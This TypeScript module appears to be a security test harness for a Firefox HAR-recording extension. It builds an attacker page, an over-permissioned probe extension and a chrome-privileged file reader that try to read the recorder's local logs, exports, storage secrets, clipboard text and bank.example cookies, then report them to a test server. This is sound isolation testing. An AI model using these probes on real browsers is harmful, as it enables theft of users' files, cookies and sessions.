import { PROBE_TABLE } from "./probe-table.ts";
import { buildStoredZip } from "./zip.ts";

export const PROBE_EXTENSION_ID = "och-probe@test";
export const OTHER_EXPERIMENT_ID = "och-other-experiment@test";

const PROBE_PERMISSIONS: readonly string[] = [
  "<all_urls>",
  "activeTab",
  "tabs",
  "scripting",
  "webRequest",
  "webRequestBlocking",
  "webNavigation",
  "downloads",
  "downloads.open",
  "cookies",
  "storage",
  "unlimitedStorage",
  "management",
  "nativeMessaging",
  "clipboardRead",
  "clipboardWrite",
  "notifications",
  "history",
  "sessions",
  "browsingData",
  "tabHide",
  "dns",
  "find",
];

const PROBE_META_JSON = JSON.stringify(
  PROBE_TABLE.map(({ id, group, what, positions, detect }) => ({
    id,
    group,
    label: what,
    pos: positions,
    detect,
  })),
);

/**
 * Shared probe runner executed in web, file, ext-bg, ext-page, cs-web, cs-file, and ext-devtools.
 * Metadata comes from PROBE_TABLE so browser probes and Node judgment never drift.
 */
export const PROBES_JS = `"use strict";
(function (root) {
  const META = ${PROBE_META_JSON};
  const clip = (s, n = 3000) => String(s).slice(0, n);
  const errText = (e) => (e && e.name ? e.name + ": " : "") + (e && e.message !== undefined ? e.message : String(e));
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const timeout = (ms, p, what) => Promise.race([p, sleep(ms).then(() => ({ outcome: "timeout", text: "no " + (what || "answer") + " within " + ms + " ms" }))]);
  const api = () => (typeof browser !== "undefined" ? browser : null);

  async function viaFetch(url, f) {
    const doFetch = f || fetch;
    return timeout(3000, (async () => {
      try {
        const r = await doFetch(url);
        const t = await r.text();
        return { outcome: "ok", text: "status " + r.status + ", " + t.length + " chars: " + clip(t) };
      } catch (e) { return { outcome: "error", text: errText(e) }; }
    })(), "fetch result");
  }

  function viaXhr(url) {
    return timeout(3000, new Promise((resolve) => {
      try {
        const x = new XMLHttpRequest();
        x.open("GET", url);
        x.onload = () => resolve({ outcome: "ok", text: "status " + x.status + ", " + String(x.responseText).length + " chars: " + clip(x.responseText) });
        x.onerror = () => resolve({ outcome: "error", text: "error event, status " + x.status + ", readyState " + x.readyState });
        x.send();
      } catch (e) { resolve({ outcome: "error", text: errText(e) }); }
    }), "xhr event");
  }

  const keep = [];
  function element(tag, url, ms = 1500) {
    return new Promise((resolve) => {
      const el = document.createElement(tag);
      let done = false;
      const finish = (outcome) => {
        if (done) return;
        done = true;
        let text = outcome;
        if (tag === "iframe") {
          try {
            const d = el.contentDocument;
            text += d ? "; contentDocument readable, text: " + clip(d.documentElement ? d.documentElement.textContent : "", 2000) : "; contentDocument null";
          } catch (e) { text += "; contentDocument: " + errText(e); }
          try { text += "; contentWindow.location.href: " + el.contentWindow.location.href; } catch (e) { text += "; contentWindow.location.href: " + errText(e); }
        }
        if (tag === "link") {
          try { text += "; cssRules: " + (el.sheet ? el.sheet.cssRules.length : "no sheet"); } catch (e) { text += "; cssRules: " + errText(e); }
        }
        if (tag === "img") text += "; naturalWidth " + el.naturalWidth;
        keep.push(el);
        resolve({ outcome, text });
      };
      el.onload = () => finish("load");
      el.onerror = () => finish("error");
      setTimeout(() => finish("timeout"), ms);
      if (tag === "link") { el.rel = "stylesheet"; el.href = url; } else el.src = url;
      (document.body || document.documentElement).appendChild(el);
    });
  }

  async function oracle(tag, hit, miss) {
    const a = await element(tag, hit);
    const b = await element(tag, miss);
    const head = (s) => s.text.split(";")[0];
    return { outcome: head(a) === head(b) ? "same" : "differs", text: "existing path: " + a.text + " | missing path: " + b.text, differs: head(a) !== head(b) };
  }

  async function openTab(create) {
    const b = api();
    try {
      const tab = await create();
      await sleep(1000);
      let after = "";
      try { const t = await b.tabs.get(tab.id); after = "url " + t.url + ", status " + t.status + ", title " + t.title; } catch (e) { after = errText(e); }
      try { await b.tabs.remove(tab.id); } catch (e) {}
      return { outcome: "ok", text: "created; 1 s later: " + after };
    } catch (e) { return { outcome: "error", text: errText(e) }; }
  }

  async function navigateVictim(plan, url) {
    const b = api();
    const tab = await b.tabs.create({ url: plan.victimUrl, active: false });
    await sleep(500);
    let res;
    try {
      await b.tabs.update(tab.id, { url });
      await sleep(1000);
      const t = await b.tabs.get(tab.id);
      res = { outcome: "ok", text: "update resolved; 1 s later: url " + t.url + ", title " + t.title };
    } catch (e) { res = { outcome: "error", text: errText(e) }; }
    try { await b.tabs.remove(tab.id); } catch (e) {}
    return res;
  }

  async function windowOpen(url) {
    try {
      const w = window.open(url, "_blank");
      if (!w) return { outcome: "error", text: "window.open returned null" };
      await sleep(1000);
      let text = "opened";
      try { text += "; document text: " + clip(w.document.documentElement.textContent, 2000); } catch (e) { text += "; document: " + errText(e); }
      try { text += "; location: " + w.location.href; } catch (e) { text += "; location: " + errText(e); }
      try { w.close(); } catch (e) {}
      return { outcome: "ok", text };
    } catch (e) { return { outcome: "error", text: errText(e) }; }
  }

  async function reachEach(urls) {
    const results = await Promise.all(urls.map(async (u) => {
      const [f, e] = await Promise.all([viaFetch(u), element("link", u, 1500)]);
      const hit = f.outcome === "ok" || e.outcome === "load";
      return { hit, line: u + " -> fetch " + (f.outcome === "ok" ? f.text.slice(0, 120) : f.text.slice(0, 80)) + "; <link> " + e.outcome };
    }));
    const reached = results.filter((r) => r.hit).length;
    return { outcome: reached + " of " + urls.length + " reachable", text: results.map((r) => r.line).join("\\n") };
  }

  function summarizeDownloads(items) {
    return items.map((d) => d.filename + " | url " + d.url + " | " + d.mime + " | " + d.fileSize + " bytes | exists " + d.exists + " | byExtensionId " + (d.byExtensionId || "-")).join("\\n") || "no download items";
  }

  async function sendMessageTo(id) {
    try {
      const r = await timeout(2500, api().runtime.sendMessage(id, { op: "getRecordingStatus" }), "reply");
      return r && r.outcome === "timeout" ? r : { outcome: "ok", text: "reply: " + JSON.stringify(r) };
    } catch (e) { return { outcome: "error", text: errText(e) }; }
  }

  function connectTo(id) {
    return timeout(2500, new Promise((resolve) => {
      try {
        const port = api().runtime.connect(id);
        port.onDisconnect.addListener((p) => resolve({ outcome: "disconnected", text: "onDisconnect, error: " + (p.error ? p.error.message : "none") }));
        port.onMessage.addListener((m) => resolve({ outcome: "message", text: JSON.stringify(m) }));
        port.postMessage({ op: "getRecordingStatus" });
      } catch (e) { resolve({ outcome: "error", text: errText(e) }); }
    }), "disconnect or message");
  }

  async function recorderTabs(plan) {
    const tabs = await api().tabs.query({});
    return tabs.filter((t) => !t.url || t.url.startsWith(plan.rec.base));
  }

  async function timing(plan) {
    const a = [], b = [];
    const once = async (url) => { const t0 = performance.now(); let e = ""; try { await fetch(url); e = "ok"; } catch (x) { e = errText(x); } return { ms: performance.now() - t0, e }; };
    let ea = "", eb = "";
    for (let i = 0; i < 15; i++) {
      const x = await once(plan.rec.base + "manifest.json"); a.push(x.ms); ea = x.e;
      const y = await once("moz-extension://" + plan.randomUuid + "/manifest.json"); b.push(y.ms); eb = y.e;
    }
    const med = (v) => v.slice().sort((p, q) => p - q)[Math.floor(v.length / 2)].toFixed(2);
    return { outcome: ea === eb ? "same" : "differs", differs: ea !== eb, text: "installed uuid: median " + med(a) + " ms, error \\"" + ea + "\\" | random uuid: median " + med(b) + " ms, error \\"" + eb + "\\" (15 each, alternating)" };
  }

  async function idbRead() {
    let names = "indexedDB.databases unavailable";
    try { names = JSON.stringify(await indexedDB.databases()); } catch (e) { names = errText(e); }
    const got = await new Promise((resolve) => {
      const open = indexedDB.open("och-recorder");
      open.onerror = () => resolve("open error: " + errText(open.error));
      open.onsuccess = () => {
        const db = open.result;
        if (!db.objectStoreNames.contains("kv")) { db.close(); resolve("database opened in this origin, no kv store (empty)"); return; }
        const rq = db.transaction("kv").objectStore("kv").get("secret");
        rq.onsuccess = () => resolve("kv.secret = " + rq.result);
        rq.onerror = () => resolve("get error");
      };
    });
    return { outcome: "ok", text: "databases(): " + names + "; open(\\"och-recorder\\"): " + got };
  }

  const RUNNERS = {
    "fetch-file-log": (p) => viaFetch(p.file.log),
    "fetch-file-body": (p) => viaFetch(p.file.body),
    "fetch-file-dir": (p) => viaFetch(p.file.root),
    "fetch-file-export": (p) => viaFetch(p.file.export),
    "content-fetch-file-log": (p) => viaFetch(p.file.log, (typeof content !== "undefined" && content.fetch) ? content.fetch.bind(content) : null),
    "xhr-file-log": (p) => viaXhr(p.file.log),
    "iframe-file-log": (p) => element("iframe", p.file.log),
    "iframe-file-root": (p) => element("iframe", p.file.root),
    "iframe-file-export": (p) => element("iframe", p.file.export),
    "img-file-oracle": (p) => oracle("img", p.file.body, p.file.missing),
    "script-file-oracle": (p) => oracle("script", p.position === "file-mutated" ? p.file.log : p.file.guessedLog, p.file.missing),
    "css-file-oracle": (p) => oracle("link", p.position === "file-mutated" ? p.file.log : p.file.guessedLog, p.file.missing),
    "iframe-site-oracle": (p) => oracle("iframe", p.position === "file-mutated" ? p.file.siteDir : p.file.guessedSiteDir, p.file.missingSite),
    "script-root-oracle": (p) => oracle("script", p.file.root, p.file.missingRoot),
    "script-site-oracle": (p) => oracle("script", p.position === "file-mutated" ? p.file.siteDir : p.file.guessedSiteDir, p.file.missingSite),
    "viewsource-fetch": (p) => viaFetch("view-source:" + p.file.log),
    "viewsource-iframe": (p) => element("iframe", "view-source:" + p.file.log),
    "jar-file-fetch": (p) => viaFetch("jar:" + p.file.log + "!/"),
    "jar-file-iframe": (p) => element("iframe", "jar:" + p.file.log + "!/"),
    "redirect-fetch": (p) => viaFetch(p.redirectToLog),
    "redirect-iframe": (p) => element("iframe", p.redirectToLog),
    "window-open-file": (p) => windowOpen(p.file.log),
    "wr-redirect-iframe": (p) => element("iframe", p.wrRedirect + "?from=iframe"),
    "tabs-create-file": (p) => openTab(() => api().tabs.create({ url: p.file.log, active: false })),
    "tabs-create-dir": (p) => openTab(() => api().tabs.create({ url: p.file.root, active: false })),
    "tabs-update-file": (p) => navigateVictim(p, p.file.log),
    "tabs-update-redirect": (p) => navigateVictim(p, p.redirectToLog),
    "windows-create-file": (p) => openTab(async () => { const w = await api().windows.create({ url: p.file.log }); return w.tabs[0]; }),
    "downloads-download-file": async (p) => { try { const id = await api().downloads.download({ url: p.file.log, filename: "probe-copy.jsonl", conflictAction: "uniquify" }); await sleep(1000); const [d] = await api().downloads.search({ id }); return { outcome: "ok", text: "download " + id + " state " + (d && d.state) + " error " + (d && d.error) + " file " + (d && d.filename) }; } catch (e) { return { outcome: "error", text: errText(e) }; } },
    "tabs-create-viewsource": (p) => openTab(() => api().tabs.create({ url: "view-source:" + p.file.log, active: false })),
    "wr-redirect-tab": (p) => openTab(() => api().tabs.create({ url: p.wrRedirect + "?from=tab", active: false })),
    "resource-all": (p) => reachEach(p.resources.map((n) => "resource://" + n + "/")),
    "resource-traversal": (p) => reachEach(p.resourceTraversal),
    "planted-resource": async (p) => { const o = await oracle("link", p.plantedResource, p.plantedResource.replace(/[^/]+$/, "missing.jsonl")); const f = await viaFetch(p.plantedResource); return { outcome: o.outcome, differs: o.differs, text: o.text + " | fetch: " + f.text }; },
    "chrome-all": (p) => reachEach(p.chromePkgs.map((n) => "chrome://" + n + "/content/")),
    "chrome-traversal": (p) => reachEach(p.chromeTraversal),
    "moz-src-root": (p) => reachEach(p.mozSrc),
    "mozext-manifest": (p) => viaFetch(p.rec.base + "manifest.json"),
    "mozext-parent": (p) => viaFetch(p.rec.base + "experiment/parent.js"),
    "mozext-schema": (p) => viaFetch(p.rec.base + "experiment/schema.json"),
    "mozext-popup": (p) => viaFetch(p.rec.base + p.rec.popupPath),
    "mozext-script-oracle": (p) => oracle("script", p.rec.base + p.rec.popupScriptPath, "moz-extension://" + p.randomUuid + "/" + p.rec.popupScriptPath),
    "mozext-timing": (p) => timing(p),
    "mozext-frame-recorder": async (p) => { const r = await element("iframe", p.rec.base + p.rec.popupPath); try { keep[keep.length - 1].contentWindow.postMessage("probe-postmessage", "*"); r.text += "; postMessage sent"; } catch (e) { r.text += "; postMessage: " + errText(e); } await sleep(200); return r; },
    "planted-own-war-fetch": (p) => viaFetch(p.probe.base + "war.txt"),
    "planted-own-war-script": async (p) => { const r = await element("script", p.probe.base + "war.js"); return { outcome: r.outcome, text: r.text + "; window.OCH_WAR = " + (typeof window.OCH_WAR === "undefined" ? "undefined" : window.OCH_WAR) }; },
    "own-non-war": (p) => viaFetch(p.probe.base + "secret.txt"),
    "api-namespace": async () => ({ outcome: "ok", text: "typeof browser: " + (typeof browser) + "; typeof browser.oneClickHar: " + (typeof browser !== "undefined" ? typeof browser.oneClickHar : "n/a") + "; typeof chrome: " + (typeof chrome) + "; typeof window.oneClickHar: " + (typeof window.oneClickHar) }),
    "api-call": async () => { try { return { outcome: "ok", text: JSON.stringify(await browser.oneClickHar.getRecordingStatus()) }; } catch (e) { return { outcome: "error", text: errText(e) }; } },
    "sendmessage-recorder": (p) => sendMessageTo(p.rec.id),
    "sendmessage-oracle": async (p) => { const a = await sendMessageTo(p.rec.id); const b = await sendMessageTo(p.randomId); return { outcome: a.text === b.text ? "same" : "differs", differs: a.text !== b.text, text: "recorder: " + a.text + " | not installed: " + b.text }; },
    "connect-recorder": (p) => connectTo(p.rec.id),
    "tabs-query-recorder": async () => { const t = await api().tabs.query({}); return { outcome: "ok", text: t.map((x) => x.id + " " + x.url + " " + x.title).join("\\n") }; },
    "executescript-recorder-page": async (p) => { const tabs = await recorderTabs(p); if (!tabs.length) return { outcome: "no-target", text: "tabs.query returned no tab with the recorder URL" }; const out = []; for (const t of tabs) { try { const r = await api().tabs.executeScript(t.id, { code: "document.documentElement.outerHTML" }); out.push("tab " + t.id + ": returned " + clip(JSON.stringify(r), 400)); } catch (e) { out.push("tab " + t.id + " (" + t.url + "): " + errText(e)); } } return { outcome: "done", text: out.join("\\n") }; },
    "scripting-recorder-page": async (p) => { const tabs = await recorderTabs(p); if (!tabs.length) return { outcome: "no-target", text: "no tab with the recorder URL" }; const out = []; for (const t of tabs) { try { const r = await api().scripting.executeScript({ target: { tabId: t.id }, func: () => document.documentElement.outerHTML }); out.push("tab " + t.id + ": returned " + clip(JSON.stringify(r), 400)); } catch (e) { out.push("tab " + t.id + " (" + t.url + "): " + errText(e)); } } return { outcome: "done", text: out.join("\\n") }; },
    "management-getall": async () => { const all = await api().management.getAll(); return { outcome: "ok", text: all.map((a) => a.id + " | " + a.name + " | " + a.type + " | enabled " + a.enabled + " | " + a.installType + " | permissions " + JSON.stringify(a.permissions) + " | hosts " + JSON.stringify(a.hostPermissions)).join("\\n") }; },
    "downloads-search": async () => ({ outcome: "ok", text: summarizeDownloads(await api().downloads.search({})) }),
    "downloads-open-export": async () => { const items = await api().downloads.search({ filenameRegex: "\\\\.har$" }); if (!items.length) return { outcome: "no-target", text: "downloads.search found no .har item" }; try { await api().downloads.open(items[0].id); return { outcome: "ok", text: "downloads.open resolved for " + items[0].filename }; } catch (e) { return { outcome: "error", text: errText(e) }; } },
    "downloads-refetch-export": async () => { const items = await api().downloads.search({ filenameRegex: "\\\\.har$" }); if (!items.length) return { outcome: "no-target", text: "no .har item" }; const f = await viaFetch(items[0].url); let d; try { const id = await api().downloads.download({ url: items[0].url, filename: "probe-copy.har", conflictAction: "uniquify" }); await sleep(1000); const [x] = await api().downloads.search({ id }); d = "state " + (x && x.state) + ", error " + (x && x.error) + ", file " + (x && x.filename); } catch (e) { d = errText(e); } return { outcome: f.outcome, text: "fetch: " + f.text + " | downloads.download: " + d }; },
    "clipboard-after-export": async () => { try { return { outcome: "ok", text: "clipboard text: " + clip(await navigator.clipboard.readText(), 1000) }; } catch (e) { return { outcome: "error", text: errText(e) }; } },
    "notifications-getall": async () => ({ outcome: "ok", text: JSON.stringify(await api().notifications.getAll()) }),
    "storage-recorder": async () => ({ outcome: "ok", text: JSON.stringify(await api().storage.local.get(null)) }),
    "idb-recorder": () => idbRead(),
    "devtools-gethar": async () => {
      try { browser.devtools.inspectedWindow.reload({}); } catch (e) {}
      const deadline = Date.now() + 5000;
      let har = { entries: [] };
      while (Date.now() < deadline) {
        har = await browser.devtools.network.getHAR();
        if (har.entries.some((e) => e.request.url.includes("bank.example/api/done"))) break;
        await sleep(100);
      }
      return { outcome: "ok", text: har.entries.length + " entries: " + clip(JSON.stringify(har.entries.map((e) => ({ url: e.request.url, cookie: (e.request.headers.find((h) => /^cookie$/i.test(h.name)) || {}).value }))), 1500) };
    },
    "baseline-webrequest": async () => ({ outcome: "ok", text: JSON.stringify(root.OCH_BASELINE || {}) }),
  };

  async function runAll(position, plan, report, only, asPosition) {
    plan.position = position;
    for (const meta of META) {
      if (!meta.pos.includes(asPosition || position)) continue;
      if (only && !only.includes(meta.id)) continue;
      let observed;
      try {
        const fn = RUNNERS[meta.id];
        observed = fn ? await fn(plan) : { outcome: "threw", text: "missing runner for " + meta.id };
      } catch (e) {
        observed = { outcome: "threw", text: errText(e) };
      }
      await report({ kind: "row", browser: plan.browser, position, probe: meta.id, observed: { outcome: observed.outcome, differs: !!observed.differs, text: clip(observed.text, 6000) } });
    }
    await report({ kind: "position-done", browser: plan.browser, position, href: String(location.href), origin: String(location.origin) });
  }

  root.OCH_PROBES = { runAll };
})(typeof window !== "undefined" ? window : globalThis);
`;

export const PAGE_RUNNER_JS = `"use strict";
(async function run(BASE, pos) {
  const report = (row) => fetch(BASE + "/report", { method: "POST", body: JSON.stringify(row) }).catch(() => {});
  const pause = (ms) => new Promise((r) => setTimeout(r, ms));
  let plan = null;
  while (!plan) {
    try { const p = await (await fetch(BASE + "/plan")).json(); if (p.ready) plan = p; } catch (e) {}
    if (!plan) await pause(100);
  }
  for (;;) {
    try { const g = await (await fetch(BASE + "/go?pos=" + pos)).json(); if (g.go) break; } catch (e) {}
    await pause(100);
  }
  const second = pos === "file-no-marionette" || pos === "file-mutated";
  await OCH_PROBES.runAll(pos, plan, report, second ? plan.noMarionetteProbes : null, second ? "file" : pos);
})(window.OCH_BASE, new URLSearchParams(location.search).get("pos") || window.OCH_POS);
`;

export const PROBE_HTML = `<!doctype html>
<meta charset="utf-8">
<title>attacker page</title>
<body>
<p>An ordinary web page with a content principal.</p>
<script>window.OCH_BASE = ""; window.OCH_POS = "web";</script>
<script src="/probes.js"></script>
<script src="/runner.js"></script>
</body>`;

export function buildSavedPageHtml(serverOrigin: string): string {
  return `<!doctype html>
<meta charset="utf-8">
<title>saved page</title>
<body>
<p>A saved HTML file opened from the Downloads folder.</p>
<script>window.OCH_BASE = ${JSON.stringify(serverOrigin)}; window.OCH_POS = "file";</script>
<script>
${PROBES_JS}
</script>
<script>
${PAGE_RUNNER_JS}
</script>
</body>`;
}

export function buildProbeExtensionXpi(options: {
  readonly serverOrigin: string;
  readonly warMark: string;
  readonly secretMark: string;
}): Buffer {
  const manifest = JSON.stringify(
    {
      manifest_version: 2,
      name: "Isolation probe extension",
      version: "1.0",
      browser_specific_settings: { gecko: { id: PROBE_EXTENSION_ID } },
      permissions: PROBE_PERMISSIONS,
      background: { scripts: ["probes.js", "common.js", "background.js"] },
      content_scripts: [
        {
          matches: ["<all_urls>"],
          js: ["probes.js", "common.js", "cs.js"],
          all_frames: true,
          match_about_blank: true,
          run_at: "document_idle",
        },
      ],
      devtools_page: "devtools.html",
      web_accessible_resources: ["war.txt", "war.js"],
    },
    null,
    2,
  );

  const commonJs = `"use strict";
const SERVER = ${JSON.stringify(options.serverOrigin)};
const IN_CONTENT_SCRIPT = location.protocol !== "moz-extension:";
const pause = (ms) => new Promise((r) => setTimeout(r, ms));
const relay = (op, arg) => browser.runtime.sendMessage({ och: op, arg });
const report = (row) => (IN_CONTENT_SCRIPT ? relay("report", row) : fetch(SERVER + "/report", { method: "POST", body: JSON.stringify(row) })).catch(() => {});
const getJson = async (p) => (IN_CONTENT_SCRIPT ? relay("get", p) : (await fetch(SERVER + p)).json());
async function getPlan(limitMs = 120000) {
  const t0 = Date.now();
  while (Date.now() - t0 < limitMs) {
    try { const p = await getJson("/plan"); if (p && p.ready) return p; } catch (e) {}
    await pause(100);
  }
  return null;
}
async function waitGo(pos, limitMs = 120000) {
  const t0 = Date.now();
  while (Date.now() - t0 < limitMs) {
    try { const g = await getJson("/go?pos=" + pos); if (g && g.go) return true; } catch (e) {}
    await pause(100);
  }
  return false;
}
async function runPosition(pos) {
  const plan = await getPlan();
  if (!plan || !(await waitGo(pos))) return;
  await OCH_PROBES.runAll(pos, plan, report);
}
`;

  const backgroundJs = `"use strict";
window.OCH_BASELINE = { cookieHeaders: [], responseBodies: [] };
let livePlan = null;
getPlan().then((p) => { livePlan = p; });
browser.webRequest.onBeforeSendHeaders.addListener((d) => {
  if (!/^http:\\/\\/bank\\.example\\//.test(d.url)) return;
  const c = d.requestHeaders.find((h) => /^cookie$/i.test(h.name));
  if (c) window.OCH_BASELINE.cookieHeaders.push(d.url + " Cookie: " + c.value);
}, { urls: ["<all_urls>"] }, ["requestHeaders"]);
browser.webRequest.onBeforeRequest.addListener((d) => {
  if (/^http:\\/\\/bank\\.example\\/api\\//.test(d.url)) {
    const f = browser.webRequest.filterResponseData(d.requestId);
    const dec = new TextDecoder();
    let text = "";
    f.ondata = (e) => { text += dec.decode(e.data, { stream: true }); f.write(e.data); };
    f.onstop = () => { window.OCH_BASELINE.responseBodies.push(d.url + " body: " + text.slice(0, 300)); f.close(); };
  }
  if (livePlan && d.url.startsWith(livePlan.wrRedirect)) return { redirectUrl: livePlan.file.log };
  return undefined;
}, { urls: ["<all_urls>"] }, ["blocking"]);
browser.runtime.onMessage.addListener((msg) => {
  if (!msg || !msg.och) return undefined;
  if (msg.och === "report") return fetch(SERVER + "/report", { method: "POST", body: JSON.stringify(msg.arg) }).then(() => true);
  if (msg.och === "get") return fetch(SERVER + msg.arg).then((r) => r.json());
  return undefined;
});
runPosition("ext-bg");
`;

  const csJs = `"use strict";
(async () => {
  const href = location.href;
  const relevant = location.protocol === "file:" || location.host === "attacker.example";
  if (!relevant) return;
  report({ kind: "cs-hello", href, top: window.top === window });
  const plan = await getPlan(120000);
  if (!plan) return;
  if (href.startsWith("file:") && !href.startsWith(plan.file.savedPage)) {
    const inArchive = href.startsWith(plan.file.root) || href.startsWith(plan.file.export);
    let text = "";
    try { text = document.documentElement ? document.documentElement.textContent : ""; } catch (e) { text = "read error " + e; }
    await report({ kind: "cs-file-doc", browser: plan.browser, inArchive, href, top: window.top === window, text: String(text).slice(0, 4000) });
    return;
  }
  if (window.top !== window) return;
  const pos = href.startsWith(plan.webProbeUrl) ? "cs-web" : href.startsWith(plan.file.savedPage) ? "cs-file" : null;
  if (!pos || !(await waitGo(pos))) return;
  await OCH_PROBES.runAll(pos, plan, report);
})();
`;

  const pageHtml = `<!doctype html><meta charset="utf-8"><title>probe extension page</title><body><script src="probes.js"></script><script src="common.js"></script><script src="page.js"></script></body>`;
  const devtoolsHtml = `<!doctype html><meta charset="utf-8"><body><script src="probes.js"></script><script src="common.js"></script><script src="devtools.js"></script></body>`;

  return buildStoredZip([
    { name: "manifest.json", data: Buffer.from(manifest, "utf8") },
    { name: "probes.js", data: Buffer.from(PROBES_JS, "utf8") },
    { name: "common.js", data: Buffer.from(commonJs, "utf8") },
    { name: "background.js", data: Buffer.from(backgroundJs, "utf8") },
    { name: "cs.js", data: Buffer.from(csJs, "utf8") },
    { name: "page.html", data: Buffer.from(pageHtml, "utf8") },
    { name: "page.js", data: Buffer.from('runPosition("ext-page");\n', "utf8") },
    { name: "devtools.html", data: Buffer.from(devtoolsHtml, "utf8") },
    { name: "devtools.js", data: Buffer.from('runPosition("ext-devtools");\n', "utf8") },
    { name: "war.txt", data: Buffer.from(`${options.warMark}\n`, "utf8") },
    {
      name: "war.js",
      data: Buffer.from(`window.OCH_WAR = ${JSON.stringify(options.warMark)};\n`, "utf8"),
    },
    { name: "secret.txt", data: Buffer.from(`${options.secretMark}\n`, "utf8") },
  ]);
}

export function buildOtherExperimentXpi(): Buffer {
  const manifest = JSON.stringify(
    {
      manifest_version: 2,
      name: "Another experiment API add-on",
      version: "0.0.1",
      browser_specific_settings: { gecko: { id: OTHER_EXPERIMENT_ID } },
      experiment_apis: {
        otherExp: {
          schema: "schema.json",
          parent: {
            scopes: ["addon_parent"],
            script: "parent.js",
            paths: [["otherExp"]],
            events: ["startup"],
          },
        },
      },
    },
    null,
    2,
  );

  const schema = JSON.stringify([{ namespace: "otherExp", functions: [] }]);
  const parentJs = `"use strict";
const reader = {
  observe(subject, topic, path) {
    const out = { processType: Services.appinfo.processType, isSystemPrincipal: Cu.getObjectPrincipal(this).isSystemPrincipal };
    try {
      const f = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsIFile);
      f.initWithPath(path);
      const fis = Cc["@mozilla.org/network/file-input-stream;1"].createInstance(Ci.nsIFileInputStream);
      fis.init(f, 0x01, 0, 0);
      const sis = Cc["@mozilla.org/scriptableinputstream;1"].createInstance(Ci.nsIScriptableInputStream);
      sis.init(fis);
      out.text = sis.read(Math.min(fis.available(), 4000));
      fis.close();
    } catch (e) { out.error = String(e).slice(0, 300); }
    Services.prefs.setStringPref("och.otherexp.result", JSON.stringify(out));
  },
};
this.otherExp = class extends ExtensionAPI {
  onStartup() { Services.obs.addObserver(reader, "och-other-exp-read"); }
  onShutdown() { try { Services.obs.removeObserver(reader, "och-other-exp-read"); } catch (e) {} }
  getAPI() { return { otherExp: {} }; }
};
`;

  return buildStoredZip([
    { name: "manifest.json", data: Buffer.from(manifest, "utf8") },
    { name: "schema.json", data: Buffer.from(schema, "utf8") },
    { name: "parent.js", data: Buffer.from(parentJs, "utf8") },
  ]);
}
